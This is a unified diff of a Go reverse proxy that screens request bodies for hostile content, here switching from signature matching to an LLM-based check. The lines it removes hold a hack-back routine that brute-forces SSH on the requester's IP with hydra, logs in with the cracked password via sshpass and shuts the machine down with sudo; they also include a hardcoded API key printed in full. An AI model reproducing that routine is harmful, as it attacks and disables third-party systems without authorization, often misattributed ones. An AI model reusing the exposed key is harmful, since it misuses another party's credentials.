@@ -3,21 +3,18 @@ package main
 import (
 	"bufio"
 	"bytes"
-	"crypto/rand"
 	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
-	"math/big"
 	"net/http"
 	"net/http/httputil"
 	"net/url"
 	"os"
-	"os/exec"
-	"regexp"
 	"strings"
 
+	"github.com/joho/godotenv"
 	"gopkg.in/yaml.v2"
 )
 
@@ -47,9 +44,7 @@ type Response struct {
 }
 
 func sendChatRequest(inputText string) (string, error) {
-
-	apiKey := "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"
-
+	apiKey := os.Getenv("API_KEY")
 	url := "https://api.groq.com/openai/v1/chat/completions"
 	contentType := "application/json"
 	message := map[string]interface{}{
@@ -93,21 +88,7 @@ func sendChatRequest(inputText string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	//fmt.Println("responce message", response.Choices[0].Message.Content)
 	return response.Choices[0].Message.Content, nil
-}
-
-func generateRandomString(length int) (string, error) {
-	const letters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-"
-	ret := make([]byte, length)
-	for i := 0; i < length; i++ {
-		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
-		if err != nil {
-			return "", err
-		}
-		ret[i] = letters[num.Int64()]
-	}
-	return string(ret), nil
 }
 
 func loadSignatures(filename string) ([]string, error) {
@@ -125,13 +106,13 @@ func loadSignatures(filename string) ([]string, error) {
 	return signatures, scanner.Err()
 }
 
-func checkForMaliciousContent(body string, signatures []string) bool {
+func checkBadContent(body string, signatures []string) bool {
 	for _, signature := range signatures {
 		if signature == "" || signature == "\n" || signature == " " {
 			continue
 		}
 		if strings.Contains(strings.ToLower(body), strings.ToLower(signature)) {
-			fmt.Println("Malicious content detected: ", signature)
+			fmt.Println("Bad content detected: ", signature)
 			return true
 		}
 	}
@@ -139,7 +120,10 @@ func checkForMaliciousContent(body string, signatures []string) bool {
 }
 
 func main() {
-	// 設定ファイル読み込み (YAML)
+	err := godotenv.Load()
+	if err != nil {
+		log.Fatal("Error loading .env file")
+	}
 	configData, err := os.ReadFile("config.yaml")
 	if err != nil {
 		log.Fatalf("Error reading config file: %v", err)
@@ -167,49 +151,23 @@ func main() {
 				fmt.Println("Request-Client-IP", r.RemoteAddr)
 				fmt.Println("Request-Body-Decode", strBody)
 				if strBody != "" {
-					//chatMessage, _ := sendChatRequest(strBody)
-					//if strings.Contains(chatMessage, "Yes") {
-					if checkForMaliciousContent(strBody, signatures) {
+					fmt.Println("checkBadContent: ", checkBadContent(strBody, signatures))
+					chatMessage, _ := sendChatRequest(strBody)
+					if strings.Contains(chatMessage, "Yes") {
 						fmt.Println("悪性通信")
 						http.Error(w, "悪性通信のためブロックしました", http.StatusForbidden)
-						ip := strings.Split(r.RemoteAddr, ":")[0]
-						if ip[0] == '[' {
-							return
-						}
-						fmt.Println("Evil SourceIP: ", ip)
-						cmd := exec.Command("sh", "-c", "hydra -l ubuntu -P password.lst "+ip+" ssh")
-						output, err := cmd.Output()
-						if err != nil {
-							fmt.Println(err)
-						}
-						fmt.Println(string(output))
-						re := regexp.MustCompile(`login: (\S+).*password: (\S+)`)
-						matches := re.FindStringSubmatch(string(output))
-						if len(matches) > 0 {
-							fmt.Println("Login: ", matches[1])
-							fmt.Println("Password: ", matches[2])
-							cmd = exec.Command("sh", "-c", "sshpass -p "+matches[2]+" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -l "+matches[1]+" "+ip+" sh -c 'ls && echo 1q2w3e4r | sudo -S shutdown -h now'")
-							output, err = cmd.Output()
-							if err != nil {
-								fmt.Println(err)
-							}
-							fmt.Println(string(output))
-						}
 						return
 					} else {
 						fmt.Println("良性通信")
 					}
 				}
-
 				targetURL, err := url.Parse(server.Target)
 				if err != nil {
 					log.Printf("Error parsing target URL: %v", err)
 					http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 					return
 				}
-				//fmt.Println("Proxying to", targetURL)
 				proxy := httputil.NewSingleHostReverseProxy(targetURL)
-				//fmt.Println("Proxying to")
 				proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
 					log.Printf("Proxy error: %v", err)
 					http.Error(w, "Bad Gateway", http.StatusBadGateway)
